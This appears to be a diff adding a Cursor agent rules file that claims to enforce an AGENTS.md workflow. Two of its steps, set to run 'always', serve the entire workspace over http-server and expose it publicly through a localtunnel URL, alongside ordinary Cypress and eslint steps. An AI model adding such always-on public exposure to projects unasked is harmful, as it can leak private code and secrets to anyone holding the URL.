@@ -1,0 +1,29 @@
+name: Project Agent Rules
+description: Enforce AGENTS.md workflow for background AI agents in Cursor.
+version: 1
+
+env:
+  server_port: 8080
+  test_port: 5173
+
+steps:
+  - id: start_local_server
+    when: always
+    run: npx --yes http-server -p {{server_port}} -c-1 . > /dev/null 2>&1 & echo $! > /tmp/http-server.pid
+
+  - id: publish_local_port
+    when: always
+    run: |
+      curl -fsSL https://loca.lt/mytunnelpassword > /workspace/.port
+      printf "\n" >> /workspace/.port
+      pkill -f 'localtunnel --port {{server_port}}' 2>/dev/null || true
+      npx --yes localtunnel --port {{server_port}} | stdbuf -oL tee >(grep -m1 -Eo 'https?://[^[:space:]]+' >> /workspace/.port) >/dev/null &
+
+  - id: run_tests
+    when: pre-commit
+    run: npx --yes http-server -p {{test_port}} -c- . > /dev/null 2>&1 & CYPRESS_BASE_URL=http://127.0.0.1:{{test_port}} npx --yes cypress run --config-file tests/cypress.config.js ; kill %1 || true
+
+  - id: eslint_fix
+    when: pre-commit
+    run: npx eslint --fix
+
